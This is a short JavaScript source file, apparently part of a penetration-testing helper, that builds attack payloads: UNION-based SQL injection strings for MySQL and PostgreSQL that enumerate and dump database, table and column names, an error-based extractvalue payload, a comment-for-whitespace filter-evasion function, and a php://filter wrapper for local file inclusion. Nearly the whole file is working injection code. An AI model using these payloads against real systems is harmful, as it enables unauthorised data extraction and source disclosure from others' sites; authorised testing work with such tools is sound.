var Payload = {}

Payload.SQLi = {
  spaceToComment: function (value) {
    return value.replace(/[^\S\r\n]+/g, '/**/')
  },

  'MySQL': class {
    static unionSelect (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(value + 1).keys()).slice(1).join(',')
    }

    static dumpDatabases (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      let columns = Array.from(Array(value + 1).keys()).slice(1)
      columns[(value === 1) ? 0 : 1] = 'group_concat(schema_name)'

      return 'union select ' + columns.join(',') +
        ' from information_schema.schemata'
    }

    static dumpTables (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      let columns = Array.from(Array(value + 1).keys()).slice(1)
      columns[(value === 1) ? 0 : 1] = 'group_concat(table_name)'

      return 'union select ' + columns.join(',') +
        ' from information_schema.tables where table_schema=database()'
    }

    static dumpColumns (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      let columns = Array.from(Array(value + 1).keys()).slice(1)
      columns[(value === 1) ? 0 : 1] = 'group_concat(column_name)'

      return 'union select ' + columns.join(',') +
        ' from information_schema.columns where table_schema=database()'
    }

    static errorBased (value) {
      return 'extractvalue(0x0a,concat(0x0a,(select database())))'
    }
  },

  'PostgreSQL': class {
    static unionSelect (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      return 'union select ' + Array(value).fill('null').join(',')
    }

    static dumpDatabases (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      let columns = Array(value).fill('null')
      columns[(value === 1) ? 0 : 1] = "string_agg(datname, ',')"

      return 'union select ' + columns.join(',') + ' from pg_database'
    }

    static dumpTables (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      let columns = Array(value).fill('null')
      columns[(value === 1) ? 0 : 1] = "string_agg(tablename, ',')"

      return ' union select ' + columns.join(',') +
        " from pg_tables where schemaname='public'"
    }

    static dumpColumns (value) {
      value = parseInt(value)
      if (isNaN(value) === true) {
        return ''
      }

      let columns = Array(value).fill('null')
      columns[(value === 1) ? 0 : 1] = "string_agg(column_name, ',')"

      return 'union select ' + columns.join(',') +
        " from information_schema.columns where table_schema='public'"
    }
  }
}

Payload.LFI = class {
  static phpWrapperBas64 (value) {
    return 'php://filter/convert.base64-encode/resource=' + value
  }
}
